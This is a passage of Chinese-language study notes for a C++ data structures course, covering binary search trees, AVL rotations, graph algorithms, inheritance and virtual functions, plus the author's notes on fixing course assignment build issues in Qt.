<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">BSTNode</span> { </span><br><span class="line">   string key; </span><br><span class="line">   BSTNode *left, *right; </span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<h4 id="插入节点">插入节点</h4>
<ul>
<li><p>使用二分查找的思想</p></li>
<li><p>从根节点开始递归，小于根节点就进入左子树，否则进入右子树，直到找到插入位置</p>
<p>注意：插入值不能与二叉排序树中的值重复</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *注意这里使用的是对指针的引用，因为函数类型是void，无返回值，只在函数内修改值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insertNode</span><span class="params">(BSTNode * &amp; t, <span class="type">const</span> string &amp; key)</span> </span>{   </span><br><span class="line">   <span class="keyword">if</span> (t == <span class="literal">NULL</span>) { </span><br><span class="line">      t = <span class="keyword">new</span> BSTNode; </span><br><span class="line">      t-&gt;key = key; </span><br><span class="line">      t-&gt;left = t-&gt;right = <span class="literal">NULL</span>; </span><br><span class="line">   } <span class="keyword">else</span> { </span><br><span class="line">      <span class="keyword">if</span> (key != t-&gt;key) { </span><br><span class="line">         <span class="keyword">if</span> (key &lt; t-&gt;key) { </span><br><span class="line">            <span class="built_in">insertNode</span>(t-&gt;left, key); </span><br><span class="line">         } <span class="keyword">else</span> { </span><br><span class="line">            <span class="built_in">insertNode</span>(t-&gt;right, key); </span><br><span class="line">         } </span><br><span class="line">      } </span><br><span class="line">   } </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
</ul>
<h4 id="删除节点">删除节点</h4>
<p>共有三种情况，假设要删除的节点为 z</p>
<ul>
<li>叶结点：直接删除</li>
<li>只有一棵子树：让子树成为 z 的父结点的子树</li>
<li>有左右两个子树：令<strong>右子树最左下结点/直接后继（或左子树最右下结点/直接前驱）</strong>代替
z，然后删除直接后继/直接前驱结点</li>
</ul>
<p>注意：删除一个结点可能会影响多个结点，因此可能要操作多次</p>
<h4 id="遍历">遍历</h4>
<ul>
<li><strong>中序遍历</strong>（左根右）可以得到有序序列</li>
<li>先序遍历（根左右）</li>
<li>后序遍历（左右根）</li>
</ul>
<h3 id="平衡二叉树">平衡二叉树</h3>
<p>二叉搜索树的最坏情况是每个节点只有一个子树，此时查找操作的时间复杂度是O(n).</p>
<ul>
<li>平衡二叉树的左右子树高度相差不超过1</li>
<li>二叉搜索树在平衡时才能保证查找的时间复杂度为O(logn)</li>
</ul>
<h4 id="avl算法">AVL算法</h4>
<p>操作对象是最小不平衡子树</p>
<ol type="1">
<li><strong>单旋转操作</strong>
<ul>
<li><strong>LL</strong>平衡旋转（右单旋转）：在左孩子的左子树插入结点，需要旋转<strong>左孩子结点</strong></li>
<li><strong>RR</strong>平衡旋转（左单旋转）：在右孩子的右子树插入结点，需要旋转<strong>右孩子结点</strong></li>
</ul></li>
<li><strong>双旋转操作</strong>
<ul>
<li><strong>LR</strong>平衡旋转（先左后右）：在左孩子的右子树插入结点，旋转<strong>左孩子</strong>的<strong>右子树的根结点</strong>（先左后右，操作的是同一个节点）</li>
<li><strong>RL</strong>平衡旋转（先右后左）：在右孩子的左子树插入结点，旋转<strong>右孩子</strong>的<strong>左子树的根结点</strong>（先右后左，操作的是同一个节点）</li>
</ul></li>
</ol>
<p><strong>代码实现</strong>：需要在节点结构中添加平衡因子（左右节点高度差）</p>
<h2 id="chapter-18">Chapter 18</h2>
<p>图</p>
<h3 id="图的结构">图的结构</h3>
<ul>
<li>vertex ：顶点</li>
<li>edge ：边，弧</li>
<li>有向图</li>
<li>无向图</li>
<li>路径：从一个节点到另一个节点经过的弧的集合</li>
<li>回路：在同一个节点开始和结束</li>
<li>简单路径：不出现重复的节点</li>
<li>度：相邻节点数</li>
<li>入度（进入该节点）、出度（离开该节点）：有向图</li>
<li>连通图（无向图）：任意两个节点是连通的</li>
<li>连通分量：极大连通子图</li>
<li>强连通图（有向图）：任意一对顶点 v、w ，从 v 到 w、从 w 到 v
均有路径</li>
</ul>
<h3 id="图的表示形式">图的表示形式</h3>
<h4 id="邻接表">邻接表</h4>
<ul>
<li>对图的每个顶点建立一个单链表（<strong>边表</strong>），指向单链表的顶点组成顶点表（数组）</li>
<li>更适合处理稀疏图</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230815093150181.png"></p>
<h4 id="邻接矩阵">邻接矩阵</h4>
<ul>
<li>使用二维数组存放各个节点的度，或者用布尔值表示弧是否存在</li>
<li>空间复杂度O(n<sup>2</sup>)</li>
<li>更适合处理稠密图</li>
</ul>
<h3 id="图的遍历">图的遍历</h3>
<h4 id="深度优先搜索">深度优先搜索</h4>
<ul>
<li>利用循环遍历节点，在循环中调用递归</li>
<li>记录访问过的节点</li>
</ul>
<h4 id="广度优先搜索">广度优先搜索</h4>
<ul>
<li>每一轮访问与当前节点相邻的节点</li>
<li>使用队列存放当前要访问的节点</li>
<li>访问出队节点的相邻节点</li>
<li>队空则循环结束</li>
</ul>
<h3 id="最短路径">最短路径</h3>
<h4 id="dijkstra-算法">Dijkstra 算法</h4>
<ul>
<li>使用优先队列存放源点到各点的路径长度</li>
<li>利用一个集合 S 存放已被访问过的顶点</li>
<li>步骤：
<ol type="1">
<li>优先队列初始化为空</li>
<li>先将源点添加到 S 中</li>
<li>然后访问与源点相邻的顶点，并将对应的路径存入优先队列中（从小到大排列）</li>
<li>弹出优先队列队顶元素（最小），访问该点的相邻顶点并加入优先队列</li>
<li>重复上述步骤直到目标顶点</li>
</ol></li>
</ul>
<h2 id="chapter-19">Chapter 19</h2>
<p>继承</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">subclass</span> : <span class="keyword">public</span> superclass {</span><br><span class="line">    <span class="comment">// new entries for subclass</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<p><code>subclass</code>继承了<code>superclass</code>的所有公共成员，但不能直接访问<code>superclass</code>的私有成员</p>
<p>派生类对象同时也是基类对象</p>
<h3 id="公有派生">公有派生</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> {</span><br><span class="line">	......  </span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> : <span class="keyword">public</span> Parent {</span><br><span class="line">	......</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li><p>基类的公有成员将成为派生类的公有成员，派生类只能通过基类的<strong>公有方法</strong>或<strong>保护方法</strong>访问基类的私有成员</p></li>
<li><p>构造函数：派生类不能直接访问基类的私有成员，因此派生类的构造函数需要<strong>调用基类构造函数</strong></p>
<blockquote>
<p>子类的构造函数在执行时<strong>一定会</strong>调用父类的构造函数。这是因为子类的对象不仅包含子类自身的数据成员，还包含从父类继承的那些数据成员。</p>
</blockquote>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> {</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> privateVar;  <span class="comment">// 私有成员，派生类无法直接访问</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 基类的构造函数，用于初始化私有成员</span></span><br><span class="line">    <span class="built_in">Base</span>(<span class="type">int</span> x) : <span class="built_in">privateVar</span>(x) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Base constructor called, privateVar = "</span> &lt;&lt; privateVar &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 派生类的构造函数，通过调用基类的构造函数初始化基类的私有成员</span></span><br><span class="line">    <span class="built_in">Derived</span>(<span class="type">int</span> x) : <span class="built_in">Base</span>(x) {</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Derived constructor called."</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="function">Derived <span class="title">d</span><span class="params">(<span class="number">10</span>)</span></span>;  <span class="comment">// 创建派生类对象，间接初始化基类的私有成员</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>访问控制：<strong>protected</strong></p>
<ul>
<li>对于外部世界来说，保护成员和私有成员类似，都不能被直接访问</li>
<li><strong>在派生类中</strong>，可以<strong>直接访问</strong>基类的
<code>protected</code> 和 <code>public</code>
成员。这意味着在派生类的成员函数中，可以直接使用 <code>protected</code>
和 <code>public</code> 成员变量或成员函数。</li>
<li><strong>在派生类的对象上</strong>，派生类的 <code>public</code>
成员可以在外部直接访问，而 <code>protected</code>
成员只能在派生类或其子类的成员函数中访问，<strong>不能通过对象在外部访问</strong>。</li>
</ul>
</blockquote></li>
</ul>
<h3 id="虚函数">虚函数</h3>
<p>实现多态</p>
<ul>
<li><p>虚函数：子类中的函数覆盖父类函数。（在对应函数前添加<code>virtual</code>）</p>
<p>函数在基类中被声明为虚的后，它在派生类中将自动成为虚函数，不过在派生类中也使用virtual能更直观</p>
<blockquote>
<p><strong>覆盖</strong>：子类提供了一个与父类虚函数具有相同函数签名（函数名、参数类型、参数个数）的实现，称为覆盖。这个新函数将替代父类中的虚函数实现，当通过基类指针或引用调用该函数时，实际执行的是子类的实现（<strong>动态绑定</strong>）</p>
</blockquote></li>
<li><p>纯虚函数：对应函数在基类中未被实现（除了添加<code>virtual</code>还需要在函数结尾添加<code>= 0</code>，如下）</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure>
<blockquote>
<p>如果类中至少有一个函数被声明为纯虚函数，则这个类就是<strong>抽象类</strong>，抽象类<strong>不能被用于实例化对象</strong>，它只能作为<strong>接口</strong>使用。</p>
</blockquote></li>
</ul>
<p>注意：构造函数不能是虚函数；友元函数不能是虚函数，因为友元函数不属于类成员</p>
<h3 id="虚析构函数">虚析构函数</h3>
<ul>
<li><p>如果析构函数不是虚的，则将只调用对应于指针类型的析构函数，这意味着即使指针指向的是一个派生类对象，只有基类的析构函数被调用，则会导致派生类中的资源和成员变量不会被正确释放或清理。</p></li>
<li><p>如果析构函数是虚的，将<strong>调用相应对象类型的析构函数</strong>。因此，如果指针指向的是派生类对象，那么将<strong>先调用派生类的析构函数，然后自动调用基类的析构函数</strong>。因此，使用虚析构函数可以确保正确的析构函数序列被调用。</p></li>
</ul>
<h3 id="指向对象的指针">指向对象的指针</h3>
<ul>
<li><p>子类与父类在内存中所占空间大小可能不同，因此不能直接将子类对象赋值给父类对象。</p></li>
<li><p>使用基类指针指向子类对象是为了实现<strong>多态</strong>（polymorphism）和<strong>动态绑定</strong>（dynamic
binding）</p></li>
<li><p>当基类指针指向子类对象时，该指针的<strong>静态类型</strong>（compile-time
type）是基类类型，而指针实际指向对象的<strong>动态类型</strong>（run-time
type）是子类类型。示例：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Parent's show function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">nonVirtualFunc</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Parent's non-virtual function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> : <span class="keyword">public</span> Parent {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> <span class="keyword">override</span> </span>{  <span class="comment">// 或者写成 `virtual void show()`</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Child's show function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">nonVirtualFunc</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Child's non-virtual function"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Parent* ptr = <span class="keyword">new</span> <span class="built_in">Child</span>();</span><br><span class="line"></span><br><span class="line">    ptr-&gt;<span class="built_in">show</span>();           <span class="comment">// 动态绑定，调用子类的虚函数</span></span><br><span class="line">    ptr-&gt;<span class="built_in">nonVirtualFunc</span>();  <span class="comment">// 静态绑定，调用基类的非虚函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span> ptr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li>
<li><p>当程序执行到一个函数调用时，系统需要决定调用哪个具体的函数，这个过程就叫做<strong>联编</strong>。联编可以在<strong>编译时</strong>或<strong>运行时</strong>进行，这分别被称为<strong>静态联编</strong>和<strong>动态联编</strong>。</p>
<blockquote>
<p>静态联编：在编译过程中进行联编</p>
<p>动态联编：在程序运行时选择正确的虚函数</p>
</blockquote></li>
</ul>
<h2 id="额外知识">额外知识</h2>
<h3 id="内联函数">内联函数</h3>
<p>程序运行时不需要在内存中跳到对应函数的位置执行代码，在编译时，编译器会把该函数的代码副本放置在每个调用该函数的地方。（空间换时间）</p>
<ul>
<li>在函数声明或函数定义前添加<code>inline</code>关键字</li>
<li>在类内定义的函数，它具有隐式的 <code>inline</code> 说明符</li>
<li>添加<code>inline</code>关键字的函数不一定能被编译器判定为内联函数：
<ul>
<li>函数过大</li>
<li>函数递归</li>
</ul></li>
</ul>
<h3 id="虚表">虚表</h3>
<p>通常，编译器处理虚函数的方法是：<strong>给每个对象添加一个隐藏成员</strong>。隐藏成员中保存了一个指向函数地址数组的<strong>指针</strong>。这种数组称为<strong>虚函数表</strong>(virtual
function
table,vtbl)。虚函数表中存储了为类对象进行声明的<strong>虚函数地址</strong>。</p>
<p>例如，基类对象包含一个指针，该指针指向基类中包含 所有虚函数地址 的
表。同样的，派生类对象也将包含一个指向独立地址表的指针。</p>
<ul>
<li>如果派生类提供了<strong>虚函数的新定义</strong>，该虚函数表将保存新函数的地址；如果派生类没有重新定义虚函数，该vtbl将保存函数原始版本的地址。</li>
<li>如果派生类定义了<strong>新的虛函数</strong>（与基类的虚函数无关），则该函数的地址也将被添加到vtbl中。</li>
</ul>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20241020224758096.png" alt="image-20241020224758096">
<figcaption aria-hidden="true">image-20241020224758096</figcaption>
</figure>
<h3 id="虚基类">虚基类</h3>
<p><strong>虚基类</strong>（Virtual Base
Class）是C++中的一种机制，主要用于解决<strong>多重继承</strong>中<strong>菱形继承问题</strong>（diamond
problem）。菱形继承问题会导致基类的成员在派生类中出现<strong>重复拷贝</strong>，从而产生潜在的二义性问题（派生类对象可能包含多个相同的基类部分成员）。虚基类通过确保在菱形继承结构中，派生类只继承第一个基类，从而避免了这个问题。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="built_in">A</span>() : <span class="built_in">value</span>(<span class="number">0</span>) {}</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> <span class="keyword">virtual</span> A {};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> : <span class="keyword">public</span> <span class="keyword">virtual</span> A {};</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> : <span class="keyword">public</span> B, <span class="keyword">public</span> C {};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    D d;</span><br><span class="line">    d.value = <span class="number">10</span>;  <span class="comment">// 现在 D 中只有一个 A 的成员变量</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"D::value: "</span> &lt;&lt; d.value &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>或者（不使用虚基类）在代码中显式表明作用域来表示子类使用的是哪一个父类的成员：<code>d.B::value</code></p>
<h3 id="函数隐藏name-hiding">函数隐藏（<strong>name
hiding</strong>）</h3>
<p>是指基类中的成员函数被派生类中<strong>同名</strong>但<strong>不同签名</strong>（参数不同或返回不同）的成员函数覆盖，从而导致基类的函数无法在派生类对象中被直接访问。</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Base class show(int): "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(<span class="type">double</span> x)</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Base class show(double): "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">(<span class="type">int</span> x)</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"Derived class show(int): "</span> &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    Derived d;</span><br><span class="line">    d.<span class="built_in">show</span>(<span class="number">10</span>);        <span class="comment">// 调用 Derived 的 show(int)</span></span><br><span class="line">    <span class="comment">// d.show(3.14);   // 错误：Derived 中没有 show(double)</span></span><br><span class="line">    d.Base::<span class="built_in">show</span>(<span class="number">3.14</span>); <span class="comment">// 需要明确指定调用基类的 show(double)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>在派生类 <code>Derived</code> 中，定义了 <code>show(int)</code>
函数，它<strong>隐藏了</strong>基类 <code>Base</code> 中所有同名的
<code>show()</code> 函数（即 <code>show(int)</code> 和
<code>show(double)</code>）。</li>
<li>因此，当调用 <code>d.show(3.14)</code>
时，会报错，因为编译器只能看到 <code>Derived</code> 中的
<code>show(int)</code> 函数，而 <code>Base</code> 中的
<code>show(double)</code> 函数被隐藏。</li>
<li>如果你仍想调用基类的 <code>show(double)</code> 函数，可以使用
<code>d.Base::show(3.14)</code> 来明确指明调用基类的函数。</li>
</ul>
<h2 id="assignment-0">Assignment 0</h2>
<h3 id="配置环境">配置环境</h3>
<p>安装好Qt后，打开 NameHash.pro 文件，构建报错，报错信息如下：</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: Cannot find version <span class="number">2021.1</span> of CS106 library. Install CS106 package following instructions at https:<span class="comment">//web.stanford.edu/dept/cs_edu/qt.  Stop.</span></span><br></pre></td></tr></tbody></table></figure>
<p>于是打开 NameHash.pro
文件查看代码，添加下面代码方便构建时查看对应库的位置：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message(USER_DATA_DIR = $$USER_DATA_DIR)</span><br><span class="line">message(SPL_DIR = $$SPL_DIR)</span><br><span class="line">message(STATIC_LIB = $$STATIC_LIB)</span><br><span class="line">message(SPL_VERSION_FILE = $$SPL_VERSION_FILE)</span><br></pre></td></tr></tbody></table></figure>
<p>运行得到：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Project MESSAGE: USER_DATA_DIR = C:/Users/hxt/AppData/Local</span><br><span class="line">Project MESSAGE: SPL_DIR = C:/Users/hxt/AppData/Local/cs106</span><br><span class="line">Project MESSAGE: STATIC_LIB = C:\Users\hxt\AppData\Local\cs106\lib\libcs106.a</span><br><span class="line">Project MESSAGE: SPL_VERSION_FILE = C:\Users\hxt\AppData\Local\cs106\lib\version2023.1</span><br></pre></td></tr></tbody></table></figure>
<p>找到<code>lib</code>文件夹，打开发现版本是<code>2023.1</code>，于是尝试修改
NameHash.pro 文件中的版本信息：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPL_VERSION = 2021.1  ----&gt;  SPL_VERSION = 2023.1</span><br></pre></td></tr></tbody></table></figure>
<p>再次构建，成功！</p>
<h2 id="assignment-1">Assignment 1</h2>
<h3 id="结构体-1">结构体</h3>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PenStyle</span> {</span><br><span class="line">    <span class="type">double</span> width;</span><br><span class="line">    std::string color;</span><br><span class="line">};</span><br><span class="line">PenStyle style = = { <span class="number">1</span>, <span class="string">"black"</span> };  <span class="comment">// C++中结构体的名字可以直接用作类型名称，前面不需要再加struct了</span></span><br></pre></td></tr></tbody></table></figure>
<h3 id="warning">Warning</h3>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Qt internal warning: UpdateLayeredWindowIndirect failed for ptDst=(0, 0), size=(3x3), dirty=(3x3 0, 0) (参数错误。)</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 28992</span><br><span class="line"></span><br><span class="line">Qt internal warning: UpdateLayeredWindowIndirect failed for ptDst=(0, 0), size=(3x3), dirty=(3x3 0, 0) (参数错误。)</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 28992</span><br><span class="line"></span><br><span class="line">Qt internal warning: UpdateLayeredWindowIndirect failed for ptDst=(0, 0), size=(3x3), dirty=(12x12 0, 0) (参数错误。)</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 28992</span><br><span class="line"></span><br><span class="line">Qt internal warning: QObject::killTimer: Timers cannot be stopped from another thread</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 20204</span><br><span class="line"></span><br><span class="line">Qt internal warning: QObject::~QObject: Timers cannot be stopped from another thread</span><br><span class="line">  - pid: 13244</span><br><span class="line">  - thread: 20204</span><br></pre></td></tr></tbody></table></figure>
<p>Qt运行Plot时报错，不知道怎么解决</p>
<h2 id="assignment-2">Assignment 2</h2>
<h3 id="part-one">Part One</h3>
<h4 id="milestone-one">Milestone One</h4>
<ul>
<li>将文本中出现的字符串分为不同子字符串（三元组，可能用UTF-8表示），并统计其出现次数</li>
</ul>
<h4 id="milestone-two">Milestone Two</h4>
<ul>
<li><p>归一化：假设每个子字符串出现次数的平方和为s，然后将每个子字符串出现的次数除以<span class="math inline">\(\sqrt{s}\)</span>，得到对应的频率，例如下面的示例：</p>
<blockquote>
<p>"aaa": 3 "baa": 1 "aab": 1</p>
<p>计算平方和：3<sup>2</sup> + 1<sup>2</sup> + 1<sup>2</sup> = 11</p>
<p>计算频率：3/<span class="math inline">\(\sqrt{11}\)</span> =
0.904534，1/<span class="math inline">\(\sqrt{11}\)</span> =
0.301511</p>
</blockquote></li>
<li><p>难点在于如何遍历map，这里我使用的是 range-based for</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用auto遍历键值对</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; pair : myMap) {</span><br><span class="line">        std::cout &lt;&lt; pair.first &lt;&lt; <span class="string">": "</span> &lt;&lt; pair.second &lt;&lt; std::endl;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span 